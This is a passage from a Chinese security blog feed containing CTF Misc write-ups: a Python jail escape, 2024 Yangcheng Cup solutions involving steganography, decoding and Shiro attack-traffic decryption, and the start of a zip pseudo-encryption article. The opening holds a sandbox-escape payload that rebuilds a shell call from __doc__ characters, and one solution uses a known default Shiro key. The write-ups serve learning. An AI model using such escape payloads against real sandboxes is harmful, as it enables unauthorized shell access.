class="built_in">filter</span>(input_data):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_eval_func_002EFCDB(input_data)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>再来试试join，也成功：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">86</span>],().__doc__[<span class="number">19</span>],().__doc__[<span class="number">4</span>],().__doc__[<span class="number">17</span>],().__doc__[<span class="number">10</span>]])](<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">56</span>]]))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2024羊城杯 Misc方向部分WP</title>
    <url>//post/ycb2024wp/</url>
    <content><![CDATA[<h3 id="hiden">hiden</h3>
<p>题目附件给了下面这两个文件</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb1.png"
                        alt="ycb1"
                 ></p>
<p>txt文件的内容如下</p>
<blockquote>
<p>GK4368 ;?:C</p>
<p>;G8F 34C2WVDJ?E]8&lt;8V[ V6@VX ?7 Di</p>
<p>​    8&lt;80B?8? l D]6C?BWX</p>
<p>​    DGJC0JC2 l JC2W8&lt;80B?8?X</p>
<p>​    8&lt;80B?8? l DGJC0JC2]830@=8C7Wb[ @=8C36BC6 l VJG88JCVX Z 8&lt;80B?8?</p>
<p>;G8F ;?:C]34C2WQ8C78];?:Q[ Q6@QX ?7 Di</p>
<p>​    ?886G@ l D]EC84?6?K7WX</p>
<p>​    ;?:0B?8? l @=8C?66?=W D]6C?BD6?KC7W`X X</p>
<p>D36 G2BC&lt; G2 6?2ECWJC2W8&lt;80B?8?XXi</p>
<p>​    ;?:0B?8?,G2BC&lt; Y c. l 8&lt;80B?8?,G2BC&lt;.</p>
<p>​</p>
<p>;G8F ;?:C]34C2WQFGBC2];?:Q[ Q;@QX ?7 Di</p>
<p>​    D]7C84?6?K7W?886G@X</p>
<p>​    D];6G8CD6?KC7W;?:0B?8?X</p>
</blockquote>
<p>根据名称猜测是rot47+rot13，解密可以得到下面的东西，目测python脚本</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb2.png"
                        alt="ycb2"
                 ></p>
<p>然后再来一次rot13解密，即可得到下面这个加密脚本</p>
<p>对照上面这个加密脚本，写一个脚本提取flag即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> wave.<span class="built_in">open</span>(<span class="string">&quot;hiden.wav&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    wav_data = <span class="built_in">bytearray</span>(f.readframes(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">file_len = <span class="built_in">int</span>.from_bytes(wav_data[<span class="number">0</span>:<span class="number">3</span>*<span class="number">4</span>:<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">extracted_data = <span class="built_in">bytes</span>([wav_data[i*<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">3</span> + file_len)])</span><br><span class="line"><span class="built_in">print</span>(extracted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ok，now you find me,so the flag give you</span></span><br><span class="line"><span class="comment"># DASCTF&#123;12jkl-456m78-90n1234&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="checkin">checkin</h3>
<p>题目附件给了一个压缩包，里面有一个Flag.txt</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb3.png"
                        alt="ycb3"
                 ></p>
<p>压缩包注释里的字符串base58解码后得到:Welcome2GZ</p>
<p>然后Flag.txt把多余的\x00字符删掉可以得到一个pacpng流量包文件，里面主要是SMB流量</p>
<p>写了一个python脚本来统计每行\x00字符的数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict = &#123;</span><br><span class="line">    &quot;11&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;12&quot;: &quot;2&quot;,</span><br><span class="line">    &quot;13&quot;: &quot;3&quot;,</span><br><span class="line">    &quot;14&quot;: &quot;4&quot;,</span><br><span class="line">    &quot;15&quot;: &quot;5&quot;,</span><br><span class="line">    &quot;16&quot;: &quot;6&quot;,</span><br><span class="line">    &quot;17&quot;: &quot;7&quot;,</span><br><span class="line">    &quot;18&quot;: &quot;8&quot;,</span><br><span class="line">    &quot;19&quot;: &quot;9&quot;,</span><br><span class="line">    &quot;20&quot;: &quot;A&quot;,</span><br><span class="line">    &quot;21&quot;: &quot;B&quot;,</span><br><span class="line">    &quot;22&quot;: &quot;C&quot;,</span><br><span class="line">    &quot;23&quot;: &quot;D&quot;,</span><br><span class="line">    &quot;24&quot;: &quot;E&quot;,</span><br><span class="line">    &quot;25&quot;: &quot;F&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def calc():</span><br><span class="line">    with open(&quot;Flag.txt&quot;, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    res = []</span><br><span class="line">    for line in data[:4785]:</span><br><span class="line">        cnt = 0</span><br><span class="line">        for item in line:</span><br><span class="line">            if item == 0:</span><br><span class="line">                cnt += 1</span><br><span class="line">        res.append(cnt)</span><br><span class="line">    for item in res:</span><br><span class="line">        # print(dict[str(item)], end=&quot;&quot;)</span><br><span class="line">        print(item, end=&#x27; &#x27;)</span><br><span class="line">    # print(len(res))</span><br><span class="line">    # print(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    with open(&quot;Flag.txt&quot;, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read().replace(b&#x27;\x00&#x27;, b&#x27; &#x27;)</span><br><span class="line">    with open(&quot;hex.txt&quot;, &quot;wb&quot;) as f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    calc()</span><br><span class="line">    # solve()</span><br></pre></td></tr></table></figure>
<p>（wbstego隐写，待复现）</p>
<h3 id="1z-misc">1z_misc</h3>
<p>附件下载下来后有一个天机不可泄露.txt</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb4.png"
                        alt="ycb4"
                 ></p>
<p>根据网上找到的信息，女可以是坐标(1,1)和坐标(11,24)位置，觜可以是(9,1)和(7,25)位置，根据 是以十二岁 可知十二时辰，每个时辰末尾对应的星宿为坐标开始的字<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb5.png"
                        alt="ycb5"
                 ></p>
<p>获得如下列表</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb6.png"
                        alt="ycb6"
                 ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">心胃心奎奎心奎心胃心心心胃心心胃心奎奎奎奎胃奎心奎奎胃奎心奎心奎奎</span><br></pre></td></tr></table></figure>
<p>然后只有三个字，猜测是摩斯电码，解得解压密码 E@SI1Y!</p>
<p>解压后得到一个flag文件和一个hint.jpg</p>
<p>hint文件中提示了天琴座，天琴座的英文是 lyra</p>
<p>联想到前不久2024ISCC考察的一道题目，主要用到了这个开源项目 <a class="link"   href="https://github.com/google/lyra" >https://github.com/google/lyra<i class="fas fa-external-link-alt"></i></a></p>
<p>因此按照Github上的步骤安装一下lyra，这个项目需要使用 bazel 进行安装，所以安装lyra之前需要先安装bazel</p>
<p>安装完成后，把之前那段未知数据的后缀改为.lyra，然后使用lyra解码即可得到一个wav文件</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb7.png"
                        alt="ycb7"
                 ></p>
<p>打开wav，发现语音播报了社会主义核心价值观编码，因此直接找个在线网站识别然后解密即可</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb8.png"
                        alt="ycb8"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb9.png"
                        alt="ycb9"
                 ></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">DASCTF&#123;W0w!_You_d0_4_g00d_j0b!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="不一样的数据库-2">不一样的数据库_2</h3>
<p>题目附件给了一个压缩包，解压密码是弱密码直接爆破就行：753951</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb10.png"
                        alt="ycb10"
                 ></p>
<p>解压后得到一张定位块丢失的二维码，修复定位块</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb11.png"
                        alt="ycb11"
                 ></p>
<p>扫码即可得到一下内容</p>
<blockquote>
<p>NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</p>
</blockquote>
<p>rot13解密一下得到：AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb12.png"
                        alt="ycb12"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb13.png"
                        alt="ycb13"
                 ></p>
<blockquote>
<p>Title:passisDASCTF</p>
<p>UserName:passisDASCTF</p>
<p>Password:WBArAG6ku6ALmLGGn3iq</p>
<p>Notes:给你了可以找到flag吗,真相就在其中</p>
</blockquote>
<p>翻看历史记录，在里面找到一段AES加密的密文</p>
<blockquote>
<p>U2FsdGVkX193h7iNsZs3RsLxH+V1zztkdS+fBy2ZQfzH77Uo4l3hSWplMV+GcLpAGflXlQuPTU5qIkOY7xJN9A==</p>
</blockquote>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb14.png"
                        alt="ycb14"
                 ></p>
<p>用DASCTF作为密钥<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb15.png"
                        alt="ycb15"
                 >解一下这个AES即可得到flag:<code>DASCTF&#123;snsnndjahenanheanjjskk12235&#125;</code></p>
<h3 id="miaoro">miaoro</h3>
<p>翻看流量包，发现执行的命令在请求头的 GWHT 字段中</p>
<p>在流10中发现执行了 echo Th15_11111111s_pP@sssssw000rd!!!&gt;pass.txt 命令</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb16.png"
                        alt="ycb16"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb17.png"
                        alt="ycb17"
                 ></p>
<p>在流13中发现下载了一个secret.txt</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb18.png"
                        alt="ycb18"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb19.png"
                        alt="ycb19"
                 ></p>
<p>base64解码响应的数据，发现有一个数据逆序的压缩包<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb20.png"
                        alt="ycb20"
                 ></p>
<p>手动提取出压缩包，用之前得到的密码：Th15_11111111s_pP@sssssw000rd!!!</p>
<p>解压压缩包可以得到一张 flag2.png 图片，图片明显分块，尝试拼图后发现无果，考虑JPG图片宽高修改</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb22.jpg"
                        alt="ycb22"
                 ></p>
<p>获得一个猫猫字母表，谷歌识图以后找到对照表</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb23.jpg"
                        alt="ycb23"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923170322209.png"
                        alt="image-20240923170322209"
                 ></p>
<p>得到后半段flag</p>
<p>在导出HTTP对象中导出几个网页，通过谷歌识图可以发现是<code>sharo-attacker</code>流量，追踪前几个流可以发现<code>sharo-attacker</code>内置字典的第十个密码就是密码：<code>MTIzNDU2Nzg5MGFiY2RlZg==</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 补位</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + <span class="built_in">chr</span>(<span class="number">16</span> - <span class="built_in">len</span>(s) % <span class="number">16</span>) * (<span class="number">16</span> - <span class="built_in">len</span>(s) % <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 除去补16字节的多余字符</span></span><br><span class="line">unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_CBC_Decrypt</span>(<span class="params">data, key, iv</span>): <span class="comment"># CBC模式的解密函数，data为密文，key为16字</span></span><br><span class="line">节密钥</span><br><span class="line">	aes = AES.new(key=key, mode=AES.MODE_CBC, iv=iv) <span class="comment"># 创建解密对象</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># decrypt AES解密 B64decode为base64 转码</span></span><br><span class="line">    result = aes.decrypt(data)</span><br><span class="line">    result = unpad(result) <span class="comment"># 除去补16字节的多余字符</span></span><br><span class="line">    <span class="keyword">return</span> result <span class="comment"># 以字符串的形式返回</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force</span>(<span class="params">data, key</span>):</span><br><span class="line">    f = base64.b64decode(data)</span><br><span class="line">    </span><br><span class="line">    keys = <span class="built_in">open</span>(<span class="string">&quot;shiro_keys.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    keyb = base64.b64decode(key)</span><br><span class="line">    iv = f[:<span class="number">16</span>]</span><br><span class="line">    enc = f[<span class="number">16</span>:]</span><br><span class="line">    de = aes_CBC_Decrypt(enc, keyb, iv)</span><br><span class="line">    <span class="keyword">return</span> de</span><br><span class="line"></span><br><span class="line">data =</span><br><span class="line"><span class="string">&quot;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&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;d.data&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(binascii.hexlify(force(data,<span class="string">&quot;MTIzNDU2Nzg5MGFiY2RlZg==&quot;</span>)).decode())</span><br></pre></td></tr></table></figure>
<p>然后得到 Java 序列化数据，用<code>SerializationDumper</code>得到结构化数据</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb21.jpg"
                        alt="ycb21"
                 ></p>
<p>得到前半段flag，拼接获得<code>DASCTF&#123;B916CFEB-C40F-45D6-A7BC-EB OFDELQDIAA&#125;</code></p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>深度理解压缩包伪加密</title>
    <url>//post/ysbwjm/</url>
    <content><![CDATA[<p>压缩包伪加密看似很简单，但其实网上绝大部分教程都没有讲明白，所以准备自己写一篇文章，以zip文件为主。</p>
<h3 id="压缩包文件结构">压缩包文件结构</h3>
<p>根据<a class="link"   href="https://ctf-wiki.org/misc/archive/zip/" >ZIP 格式 - CTF Wiki<i class="fas fa-external-link-alt"></i></a>，我们可以知道一个压缩包被分为三部分，分别为压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志，对应010 Editor变量中的record + dirEntry + endLocator三部分。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250203215631516.png"
                        alt="image-20250203215631516"
                 ></p>
<p><strong>文件源数据区(record)</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">HEX 数据</th>
<th style="text-align:left">描述</th>
<th style="text-align:left">010Editor 模板数据</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">50 4B 03 04</td>
<td style="text-align:left">zip 文件头标记，看文本的话就是 PK 开头</td>
<td style="text-align:left">char frSignature[4]</td>
</tr>
<tr>
<td style="text-align:left">0A 00</td>
<td style="text-align:left">解压文件所需 pkware 版本</td>
<td style="text-align:left">ushort frVersion</td>
</tr>
<tr>
<td style="text-align:left">00 00</td>
<td style="text-align:left">全局方式位标记（有无加密）</td>
<td style="text-align:left">ushort frFlags</td>
</tr>
<tr>
<td style="text-align:left">00 00</td>
<td style="text-align:left">压缩方式</td>
<td style="text-align:left">enum COMPTYPE frCompression</td>
</tr>
<tr>
<td style="text-align:left">E8 A6</td>
<td style="text-align:left">最后修改文件时间</td>
<td style="text-align:left">DOSTIME frFileTime</td>
</tr>
<tr>
<td style="text-align:left">32 53</td>
<td style="text-align:left">最后修改文件日期</td>
<td style="text-align:left">DOSDATE frFileDate</td>
</tr>
<tr>
<td style="text-align:left">0C 7E 7F D8</td>
<td style="text-align:left">CRC-32 校验</td>
<td style="text-align:left">uint frCrc</td>
</tr>
</tbody>
</table>
<p><strong>文件目录区(dirEntry)</strong></p>
<table>
<thead>
<tr>
<th>HEX 数据</th>
<th>描述</th>
<th>010Editor 模板数据</th>
</tr>
</thead>
<tbody>
<tr>
<td>50 4B 01 02</td>
<td>目录中文件文件头标记</td>
<td>char deSignature[4]</td>
</tr>
<tr>
<td>3F 00</td>
<td>压缩使用的 pkware 版本</td>
<td>ushort deVersionMadeBy</td>
</tr>
<tr>
<td>0A 00</td>
<td>解压文件所需 pkware 版本</td>
<td>ushort deVersionToExtract</td>
</tr>
<tr>
<td>00 00</td>
<td>全局方式位标记（有无加密）</td>
